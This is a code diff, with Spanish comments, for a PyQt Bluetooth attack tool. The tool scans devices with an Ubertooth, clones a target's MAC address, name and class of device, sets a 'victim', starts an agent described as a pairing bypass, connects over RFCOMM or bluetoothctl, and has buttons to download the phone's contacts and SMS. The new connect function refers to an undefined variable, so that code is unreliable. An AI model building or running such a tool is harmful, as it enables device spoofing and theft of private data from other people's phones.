@@ -16,7 +16,7 @@ class BluetoothConfigurator(QWidget):
     def __init__(self, parent=None):
         super().__init__(parent)
         self.setWindowTitle("BT-Project")
-        self.resize(800, 600)  # Ajusta el tamanio de la ventana
+       
 
         # Crear pestanias
         self.tab_widget = QTabWidget()
@@ -28,7 +28,7 @@ class BluetoothConfigurator(QWidget):
         self.tab_widget.addTab(self.bluetooth_tab, "Configuracion")
         self.tab_widget.addTab(self.agendaTel_tab, "Descargar Datos")
 
-        # Organizar widgets de la pestania Connect
+        # Organizar Widgets de la ventana donde se realiza el escaneo, clonacion, conexion y fijar victima
         conect_layout = QVBoxLayout()
         
         self.conect_tab.setLayout(conect_layout)
@@ -38,11 +38,14 @@ class BluetoothConfigurator(QWidget):
         conect_button = QPushButton("Conectar")
         
         clon_button = QPushButton("Clonar")
-        
+        # Inicializamos el objeto BluetoothScanner
         self.ubertooth_scanner = ubscan.BluetoothScanner()
+        
         self.scan_list = QListWidget()
         time_label = QLabel("Tiempo de escaneo")
         self.time_entry= QLineEdit()
+        
+        
         conect_layout.addWidget(time_label)
         conect_layout.addWidget(self.time_entry)
         conect_layout.addWidget(scan_button)
@@ -52,7 +55,7 @@ class BluetoothConfigurator(QWidget):
         conect_layout.addWidget(clon_button)
 
 
-        # Organizar widgets de la pestania Bluetooth
+        # Organizar widgets de la ventana de configuracion
         bluetooth_layout = QVBoxLayout()
         self.bluetooth_tab.setLayout(bluetooth_layout)
 
@@ -76,7 +79,7 @@ class BluetoothConfigurator(QWidget):
         bluetooth_layout.addWidget(update_button)
 
 
-        # Organizar widgets de la ventana de descarga telefonica
+        # Organizar widgets de la ventana de descarga de datos
         agenda_layout = QVBoxLayout()
         self.agendaTel_tab.setLayout(agenda_layout)
 
@@ -91,7 +94,7 @@ class BluetoothConfigurator(QWidget):
         main_layout.addWidget(self.tab_widget)
         self.setLayout(main_layout)
 
-        # Conectar seniales y slots
+        # Conectar botones a las funciones
         conect_button.clicked.connect(self.conect_device)
         set_button.clicked.connect(self.setTarget)
         update_button.clicked.connect(self.update_bluetooth_config)
@@ -101,39 +104,54 @@ class BluetoothConfigurator(QWidget):
         desMsg_button.clicked.connect(self.descarga_sms)
 
     def conect_device(self):
-        self.agent_daemon()
-        item = self.scan_list.currentItem()
-        if item:
-            item_index = self.scan_list.row(item)  # Obtener el índice del elemento en la lista
-            mac_address = self.mac_addresses.get(item_index, "")
-            name = self.name_entry.text()
-            class_of_device = self.class_of_devices.get(item_index, "")
-        self.target_mac = mac_address
-        self.target_name = name
-        sock = bluetooth.BluetoothSocket(bluetooth.RFCOMM)
-        sock.connect((mac_address, 1))
+        #Llamar a la funcion que fija el objetivo
+        self.setTarget()
+        # Se crea un objeto socket de Bluetooth para establecer conexion con el dispositivo seleccionado y si la conexion es rechazada debido al puerto rfcomm, se utiliza el comando bluetoothctl
+        try:
+            # Intenta establecer la conexion utilizando BluetoothSocket
+            sock = bluetooth.BluetoothSocket(bluetooth.RFCOMM)
+            sock.connect((mac_address, 3))
+            print("Conexión Bluetooth establecida.")
+
+        except bluetooth.btcommon.BluetoothError as e:
+            print("Error al conectar utilizando BluetoothSocket:", str(e))
+            print("Intentando conexión utilizando bluetoothctl...")
+
+        try:
+            # Intenta establecer la conexion utilizando bluetoothctl
+            subprocess.run(['bluetoothctl', 'connect', mac_address], capture_output=True)
+            print("Conexión Bluetooth establecida utilizando bluetoothctl.")
+        except subprocess.CalledProcessError as e:
+            print("Error al conectar utilizando bluetoothctl:", str(e))
 
     def setTarget(self):
+        #Llamar a la funcion que activa el agente para el bypass
         self.agent_daemon()
+        #Obtener el item de la lista que ha sido seleccionado
         item = self.scan_list.currentItem()
+        #Si existe el item, que obtenga el indice del objeto para poder sacar la direccion bluetooth
         if item:
-            item_index = self.scan_list.row(item)  # Obtener el índice del elemento en la lista
+            item_index = self.scan_list.row(item)
             mac_address = self.mac_addresses.get(item_index, "")
             name = self.name_entry.text()
-            class_of_device = self.class_of_devices.get(item_index, "")
+        # Se guardan en variables globales del objeto para poder acceder mas tarde
         self.target_mac = mac_address
         self.target_name = name
             
     def update_bluetooth_config(self):
+        # Recibe la informacion pasada en los inputs
         name = self.name_entry.text()
         address = self.address_entry.text()
         cod = self.classm_entry.text()
-
+        # Llama a la funcion encargada de establecer dichos parametros en el adaptador bluetooth, ademas pasa el CoD como entero
         updateName.clone_device(address,name,int(cod))
 
     def scan_devices(self):
+        #Se recibe el tiempo que durara el escaeno
         tiempo = self.time_entry.text()
+        # Se llama a la funcion del objeto BluetoothScanner que se encarga de escanear dispositivos bluetooth
         self.ubertooth_scanner.start_scan(duration=tiempo)
+        # Se llama a la funcion del objeto BluetoothScanner que se encarga de devlolver los dispositivos encontrados
         devices = self.ubertooth_scanner.get_devices()
         self.scan_list.clear()
         self.mac_addresses = {}  # Diccionario para almacenar las MAC addresses por nombre
